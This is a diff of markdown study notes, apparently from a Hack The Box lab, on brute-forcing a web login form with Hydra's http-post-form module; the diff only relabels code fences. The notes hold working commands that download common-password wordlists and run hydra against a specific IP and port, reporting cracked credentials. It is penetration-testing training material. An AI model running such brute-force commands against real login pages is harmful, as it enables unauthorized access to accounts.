@@ -2,19 +2,19 @@
 ## http-post-form
 Hydra's `http-post-form` service is specifically designed to target login forms. It enables the automation of POST requests, dynamically inserting username and password combinations into the request body.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ hydra [options] target http-post-form "path:params:condition_string"
 ```
 
 Failure condition example:
 
-```sh
+```shellsession
 $ hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
 ```
 
 Success condition example:
 
-```sh
+```shellsession
 $ hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
 ```
 
@@ -27,7 +27,7 @@ The `params` string consists of key-value pairs, similar to how data is encoded 
 - `Success Condition`: This defines the criteria Hydra will use to identify a successful login. It can be an HTTP status code (like S=302 for a redirect) or the presence or absence of specific text in the server's response (e.g., F=Invalid credentials or S=Welcome).
 
 Therefore, our params string would be:
-```sh
+```shellsession
 /:username=^USER^&password=^PASS^:F=Invalid credentials
 ```
 
@@ -35,7 +35,7 @@ Therefore, our params string would be:
 - `username=^USER^&password=^PASS^`: The form parameters with placeholders for Hydra.
 - `F=Invalid credentials`: The failure condition – Hydra will consider a login attempt unsuccessful if it sees this string in the response.
 
-```sh
+```shellsession
 # Download wordlists if needed
 $ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
 $ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
@@ -54,7 +54,7 @@ $ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP
         username=abc&password=xyz
         ```
    - Brute force the login form by using the `http-post-form` module with the corresponding param string matching the POST request → found credentials `admin`:`zxcvbnm`
-        ```sh
+        ```shellsession
         $ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 154.57.164.75 -s 30229 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
         Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
